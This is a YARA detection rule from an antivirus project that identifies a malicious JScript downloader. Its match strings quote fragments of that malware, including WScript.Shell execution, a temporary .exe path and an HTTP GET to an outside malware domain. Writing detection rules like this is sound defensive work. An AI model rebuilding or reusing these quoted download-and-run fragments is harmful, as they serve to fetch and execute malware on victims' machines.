rule sig_20160328_c212cd2e5682ccfa73adb1d2b0502161 {
  meta:
    description = "datamaliciousorder - file 20160328_c212cd2e5682ccfa73adb1d2b0502161.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9e4bf2b4bb5cb36b2c270ff08a190d87d4519ff278b23f623f40eccd85cc1115"

  strings:
    $s1  = "function Ncdfysit() {return Ajrva[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"LGvTAB4rBrKd.exe\";};" fullword ascii
    $s2  = "function Iyvcp(Nfutip, Sscgr){return Nfutip - Sscgr;};" fullword ascii
    $s3  = "var Ajrva = function Jyhbag() {return WScript[Nfmvavwzn](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Uhfvz](Hhrlt() * 11)} while (Wmcahwvx[\"readystate\"] < 4 );" fullword ascii
    $s5  = "Wmcahwvx[Hztvw](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Uclvgq() {return ((Znuxfxo == true) && (Znuxfxo == Tclwvw)) ? 1 : Farqrsbfi;};" fullword ascii
    $s7  = "function Dxdhwa(Kqglhiykb){Ajrva[\"Run\"](Kqglhiykb, Farqrsbfi, Farqrsbfi);};" fullword ascii
    $s8  = " while (Lguxu){" fullword ascii
    $s9  = "Znuxfxo = true; " fullword ascii
    $s10 = "function Fwgxyop()" fullword ascii
    $s11 = "var Tclwvw = false;" fullword ascii
    $s12 = "return Iyvcp(Edbegj, Butqut);" fullword ascii
    $s13 = "function Hhrlt(){return 22;};" fullword ascii
    $s14 = "var Oixccrgp = false;" fullword ascii
    $s15 = "function Ykvuuhcpz(){return Fmiduznxt;};" fullword ascii
    $s16 = "Tclwvw = true; " fullword ascii
    $s17 = "function Rldgtbfxdv(Exntwz) {var Jxxzrsj = (1, 2, 3, 4, 5, Exntwz); return Jxxzrsj;};" fullword ascii
    $s18 = "var Znuxfxo = false;" fullword ascii
    $s19 = "function Qlpaljjjiw(){return Nfmvavwzn;};" fullword ascii
    $s20 = "var Fsdgfsasz = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}